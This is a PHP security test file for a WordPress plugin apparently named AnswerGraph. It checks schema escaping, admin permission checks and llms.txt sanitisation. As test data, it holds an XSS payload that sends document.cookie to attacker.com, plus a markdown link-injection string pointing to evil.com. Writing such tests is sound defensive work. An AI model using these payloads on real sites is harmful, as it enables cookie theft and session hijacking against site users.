<?php
require_once __DIR__ . '/runner.php';

if (!defined('ABSPATH')) define('ABSPATH', __DIR__ . '/../');
if (!defined('ANSWERGRAPH_PATH')) define('ANSWERGRAPH_PATH', __DIR__ . '/../');

if (!function_exists('add_action')) {
    function add_action($tag, $callback, $priority = 10, $args = 1) {}
}
if (!function_exists('add_filter')) {
    function add_filter($tag, $callback, $priority = 10, $args = 1) {}
}
if (!function_exists('add_menu_page')) {
    function add_menu_page($title, $menu, $cap, $slug, $cb, $icon, $pos) {}
}
if (!function_exists('register_setting')) {
    function register_setting($group, $name, $args = []) {}
}
if (!function_exists('add_meta_box')) {
    function add_meta_box($id, $title, $cb, $screen, $context, $priority) {}
}
if (!function_exists('home_url')) {
    function home_url($path = '') { return 'https://dantaramandiri.co.id' . $path; }
}
if (!function_exists('get_option')) {
    function get_option($key, $default = '') { return $default; }
}
if (!function_exists('settings_fields')) {
    function settings_fields($group) {}
}
if (!function_exists('submit_button')) {
    function submit_button($text = 'Save', $type = 'primary') {}
}
if (!function_exists('checked')) {
    function checked($val, $current) {}
}
if (!function_exists('esc_html')) {
    function esc_html($str) { return htmlspecialchars($str, ENT_QUOTES, 'UTF-8'); }
}
if (!function_exists('esc_attr')) {
    function esc_attr($str) { return htmlspecialchars($str, ENT_QUOTES, 'UTF-8'); }
}
if (!function_exists('esc_textarea')) {
    function esc_textarea($str) { return htmlspecialchars($str, ENT_QUOTES, 'UTF-8'); }
}
if (!function_exists('wp_die')) {
    function wp_die($msg, $code = 403) { throw new Exception("WP_DIE_TRIGGERED: $msg (HTTP $code)"); }
}
if (!function_exists('__')) {
    function __($text, $domain = 'default') { return $text; }
}
if (!function_exists('current_user_can')) {
    global $mock_current_user_can_return;
    $mock_current_user_can_return = true;
    function current_user_can($cap) {
        global $mock_current_user_can_return;
        return $mock_current_user_can_return;
    }
}
if (!function_exists('post_password_required')) {
    function post_password_required($post) {
        return !empty($post->post_password);
    }
}
if (!function_exists('wp_json_encode')) {
    function wp_json_encode($data, $options = 0) {
        return json_encode($data, $options);
    }
}
if (!function_exists('esc_url')) {
    function esc_url($url) { return htmlspecialchars($url, ENT_QUOTES, 'UTF-8'); }
}
if (!function_exists('admin_url')) {
    function admin_url($path = '') { return 'https://dantaramandiri.co.id/wp-admin/' . ltrim($path, '/'); }
}

require_once __DIR__ . '/../includes/class-answergraph-schema.php';
require_once __DIR__ . '/../includes/class-answergraph-llmstxt.php';
require_once __DIR__ . '/../includes/class-answergraph-geo-analyzer.php';
require_once __DIR__ . '/../includes/class-answergraph-aeo-analyzer.php';
require_once __DIR__ . '/../includes/class-answergraph-compliance-linter.php';
require_once __DIR__ . '/../admin/class-answergraph-admin.php';

class TestAnswerGraphSecurity extends AnswerGraphTestCase {

    /**
     * CWE-79: Test that JSON-LD Schema escapes script tags and prevents tag breakout
     */
    public function test_schema_prevents_script_breakout_xss() {
        $schema = new AnswerGraph_Schema();
        $org = [
            'name' => 'Dantara Mandiri</script><script>alert("xss")</script>',
            'url'  => 'https://dantaramandiri.co.id/',
            'logo' => 'https://dantaramandiri.co.id/logo.png',
            'sameAs' => []
        ];
        $page = [
            'title' => 'Panduan Siujang</script><script>document.location="https://attacker.com/?c="+document.cookie</script>',
            'url'   => 'https://dantaramandiri.co.id/siujang',
        ];

        $graph = $schema->generate_graph($org, $page);
        $html = $schema->render_html($graph);

        // Crucial: The literal closing script tag "</script>" must NOT appear in the JSON payload body
        // It must be converted to \u003C/script\u003E by JSON_HEX_TAG
        $this->assertStringContainsString('\u003C/script\u003E', $html, 'Script tag must be safely hex-encoded');
        
        // Count total occurrences of literal </script> - must be exactly ONE (the genuine closing tag)
        $closing_tags_count = substr_count(strtolower($html), '</script>');
        $this->assertEquals(1, $closing_tags_count, 'Only the legitimate closing tag should exist');
    }

    /**
     * CWE-285: Test that unauthorized users without manage_options are blocked from admin settings
     */
    public function test_settings_page_blocks_unauthorized_users() {
        global $mock_current_user_can_return;
        $mock_current_user_can_return = false; // Simulate subscriber or contributor

        $admin = new AnswerGraph_Admin();
        $caught = false;
        try {
            $admin->render_settings_page();
        } catch (Exception $e) {
            if (strpos($e->getMessage(), 'WP_DIE_TRIGGERED') !== false) {
                $caught = true;
            }
        }

        $this->assertTrue($caught, 'Non-admin user must trigger wp_die');
        $mock_current_user_can_return = true; // reset
    }

    /**
     * CWE-20: Test that llms.txt safely handles markdown link injection
     */
    public function test_llmstxt_sanitizes_markdown_injection() {
        $llms = new AnswerGraph_LLMsTxt();
        $items = [
            [
                'title' => "Injected Title](https://evil.com) [Fake Link\nMalicious line",
                'url'   => 'https://dantaramandiri.co.id/clean-link',
                'description' => "Line 1\nLine 2 with break",
                'section' => "Updates\nHeader Break"
            ]
        ];

        $output = $llms->render_summary($items);

        // Ensure newlines inside title and desc are stripped into spaces
        $this->assertStringContainsString('Injected Title', $output);
        $this->assertStringContainsString('https://dantaramandiri.co.id/clean-link', $output);
        // Header should not be split into multiple lines
        $this->assertMatchesRegularExpression('/## Updates Header Break/', $output);
    }
}

run_test_file(__FILE__);
